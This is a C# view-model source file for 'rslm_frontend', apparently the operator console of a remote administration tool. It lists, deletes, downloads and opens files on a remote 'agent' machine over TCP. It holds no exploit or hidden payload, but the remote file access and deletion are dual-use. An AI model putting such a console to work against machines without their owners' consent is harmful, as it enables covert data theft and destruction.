using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Input;
using Newtonsoft.Json.Linq;
using rslm_frontend.Services;

namespace rslm_frontend.ViewModels
{
    public class FileManagerViewModel : ViewModelBase
    {
        private readonly RslmTcpClient _tcpClient;
        private readonly Action<string, string> _log;
        private readonly ObservableCollection<FileItem> _files = new ObservableCollection<FileItem>();
        private FileItem _selectedFile;
        private string _currentPath = "C:\\";
        private string _statusText = "Ready";
        private string _targetAgentId;
        private bool _isBusy;

        // Événement pour ouvrir un fichier depuis la vue
        public event Action<string> FileOpenRequested;

        public FileManagerViewModel(RslmTcpClient tcpClient, string targetAgentId, Action<string, string> log)
        {
            _tcpClient = tcpClient;
            _targetAgentId = targetAgentId ?? string.Empty;
            _log = log;

            RefreshCommand = new RelayCommand(_ => _ = RefreshAsync(), _ => _tcpClient.IsConnected && !IsBusy);
            DeleteCommand = new RelayCommand(_ => _ = DeleteAsync(), _ => _tcpClient.IsConnected && !IsBusy && SelectedFile != null);
            DownloadCommand = new RelayCommand(_ => _ = DownloadAsync(), _ => _tcpClient.IsConnected && !IsBusy && SelectedFile != null && !SelectedFile.IsDirectory);
            ParentCommand = new RelayCommand(_ => NavigateToParent(), _ => _tcpClient.IsConnected && !IsBusy && !IsRootPath());
            OpenFileCommand = new RelayCommand(_ => _ = OpenFileAsync(), _ => _tcpClient.IsConnected && !IsBusy && SelectedFile != null && !SelectedFile.IsDirectory);
        }

        public ObservableCollection<FileItem> Files => _files;

        public FileItem SelectedFile
        {
            get => _selectedFile;
            set
            {
                if (SetProperty(ref _selectedFile, value))
                {
                    ((RelayCommand)DeleteCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)DownloadCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)OpenFileCommand).RaiseCanExecuteChanged();
                }
            }
        }

        public string CurrentPath
        {
            get => _currentPath;
            set
            {
                if (SetProperty(ref _currentPath, value))
                    ((RelayCommand)ParentCommand).RaiseCanExecuteChanged();
            }
        }

        public string StatusText
        {
            get => _statusText;
            set => SetProperty(ref _statusText, value);
        }

        public string TargetAgentId
        {
            get => _targetAgentId;
            set => SetProperty(ref _targetAgentId, value);
        }

        public bool IsBusy
        {
            get => _isBusy;
            set
            {
                if (SetProperty(ref _isBusy, value))
                {
                    ((RelayCommand)RefreshCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)DeleteCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)DownloadCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)ParentCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)OpenFileCommand).RaiseCanExecuteChanged();
                }
            }
        }

        public ICommand RefreshCommand { get; }
        public ICommand DeleteCommand { get; }
        public ICommand DownloadCommand { get; }
        public ICommand ParentCommand { get; }
        public ICommand OpenFileCommand { get; }

        private bool IsRootPath()
        {
            return CurrentPath.EndsWith(":") || CurrentPath.EndsWith(":\\") || CurrentPath == "";
        }

        private void NavigateToParent()
        {
            if (IsRootPath()) return;
            try
            {
                var parentDir = Path.GetDirectoryName(CurrentPath);
                if (!string.IsNullOrEmpty(parentDir))
                {
                    CurrentPath = parentDir;
                    _ = RefreshAsync();
                }
            }
            catch (Exception ex)
            {
                StatusText = "Error: " + ex.Message;
                _log("File Manager", "Error: " + ex.Message);
            }
        }

        public async Task NavigateToPath(string path)
        {
            if (string.IsNullOrEmpty(path)) return;
            CurrentPath = path;
            await RefreshAsync();
        }

        public async Task RefreshAsync()
        {
            if (string.IsNullOrEmpty(_targetAgentId))
            {
                StatusText = "No agent selected";
                return;
            }

            IsBusy = true;
            StatusText = "Loading files...";

            try
            {
                var payload = new JObject { ["path"] = CurrentPath };
                var response = await _tcpClient.SendMessageAsync("file-list-request", _targetAgentId, payload);

                if (response["payload"]?["files"] is JArray filesArray)
                {
                    _files.Clear();
                    foreach (var file in filesArray)
                    {
                        var isDir = file["type"]?.ToString() == "directory";
                        _files.Add(new FileItem
                        {
                            Name = file["name"]?.ToString() ?? "",
                            Path = file["path"]?.ToString() ?? "",
                            Size = file["size"]?.ToObject<long>() ?? 0,
                            Type = isDir ? "Directory" : "File",
                            IsDirectory = isDir
                        });
                    }
                    StatusText = $"Loaded {_files.Count} items";
                    _log("File Manager", $"Loaded {_files.Count} items from {CurrentPath}");
                }
                else
                {
                    StatusText = "Failed to load files";
                    _log("File Manager", "Failed to load files");
                }
            }
            catch (Exception ex)
            {
                StatusText = "Error: " + ex.Message;
                _log("File Manager", "Error: " + ex.Message);
            }
            finally
            {
                IsBusy = false;
            }
        }

        public async Task DeleteAsync()
        {
            if (SelectedFile == null || string.IsNullOrEmpty(_targetAgentId)) return;

            IsBusy = true;
            StatusText = "Deleting...";

            try
            {
                var payload = new JObject { ["path"] = SelectedFile.Path };
                await _tcpClient.SendMessageAsync("file-delete-request", _targetAgentId, payload);
                StatusText = "Deleted";
                _log("File Manager", $"Deleted {SelectedFile.Path}");
                await RefreshAsync();
            }
            catch (Exception ex)
            {
                StatusText = "Error: " + ex.Message;
                _log("File Manager", "Error: " + ex.Message);
            }
            finally
            {
                IsBusy = false;
            }
        }

        public async Task DownloadAsync()
        {
            if (SelectedFile == null || SelectedFile.IsDirectory || string.IsNullOrEmpty(_targetAgentId)) return;

            IsBusy = true;
            StatusText = "Downloading...";

            try
            {
                var payload = new JObject { ["path"] = SelectedFile.Path };
                var response = await _tcpClient.SendMessageAsync("file-download-request", _targetAgentId, payload);

                var base64 = response["payload"]?["data"]?.ToString();
                if (!string.IsNullOrEmpty(base64))
                {
                    var bytes = Convert.FromBase64String(base64);
                    var savePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), SelectedFile.Name);

                    // Correction pour .NET Framework : WriteAllBytes synchrone
                    File.WriteAllBytes(savePath, bytes);

                    StatusText = "Downloaded to " + savePath;
                    _log("File Manager", $"Downloaded to {savePath}");
                }
                else
                {
                    StatusText = "Download failed";
                    _log("File Manager", "Download failed");
                }
            }
            catch (Exception ex)
            {
                StatusText = "Error: " + ex.Message;
                _log("File Manager", "Error: " + ex.Message);
            }
            finally
            {
                IsBusy = false;
            }
        }

        // MÉTHODE POUR TÉLÉCHARGER EN MÉMOIRE (pour le viewer)
        public async Task<byte[]> DownloadFileDataAsync(string remotePath)
        {
            try
            {
                var payload = new JObject { ["path"] = remotePath };
                var response = await _tcpClient.SendMessageAsync("file-download-request", _targetAgentId, payload);

                var base64 = response["payload"]?["data"]?.ToString();
                if (!string.IsNullOrEmpty(base64))
                {
                    return Convert.FromBase64String(base64);
                }
            }
            catch (Exception ex)
            {
                _log("File Manager", $"Download error: {ex.Message}");
            }
            return null;
        }

        // MÉTHODE POUR VÉRIFIER SI UN FICHIER EXISTE
        public async Task<bool> CheckFileExistsAsync(string remotePath)
        {
            try
            {
                var payload = new JObject { ["path"] = remotePath };
                var response = await _tcpClient.SendMessageAsync("file-info-request", _targetAgentId, payload);

                if (response["payload"]?["exists"] != null)
                {
                    return response["payload"]["exists"].Value<bool>();
                }
            }
            catch (Exception ex)
            {
                _log("File Manager", $"Check file error: {ex.Message}");
            }
            return false;
        }

        // MÉTHODE POUR OUVRIR UN FICHIER (déclenche l'événement)
        private async Task OpenFileAsync()
        {
            if (SelectedFile == null || SelectedFile.IsDirectory) return;

            bool exists = await CheckFileExistsAsync(SelectedFile.Path);
            if (exists)
            {
                FileOpenRequested?.Invoke(SelectedFile.Path);
            }
            else
            {
                StatusText = "File not found";
                _log("File Manager", $"File not found: {SelectedFile.Path}");
            }
        }

        public void Log(string message)
        {
            _log("File Manager", message);
        }

        public void Dispose()
        {
        }
    }

    public class FileItem : ViewModelBase
    {
        private string _name;
        private string _path;
        private long _size;
        private string _type;
        private bool _isDirectory;

        public string Name
        {
            get => _name;
            set => SetProperty(ref _name, value);
        }

        public string Path
        {
            get => _path;
            set => SetProperty(ref _path, value);
        }

        public long Size
        {
            get => _size;
            set => SetProperty(ref _size, value);
        }

        public string SizeDisplay
        {
            get
            {
                if (IsDirectory) return "";
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                int order = 0;
                double size = Size;
                while (size >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    size /= 1024;
                }
                return $"{size:0.##} {sizes[order]}";
            }
        }

        public string Type
        {
            get => _type;
            set => SetProperty(ref _type, value);
        }

        public bool IsDirectory
        {
            get => _isDirectory;
            set
            {
                if (SetProperty(ref _isDirectory, value))
                    OnPropertyChanged(nameof(SizeDisplay));
            }
        }
    }
}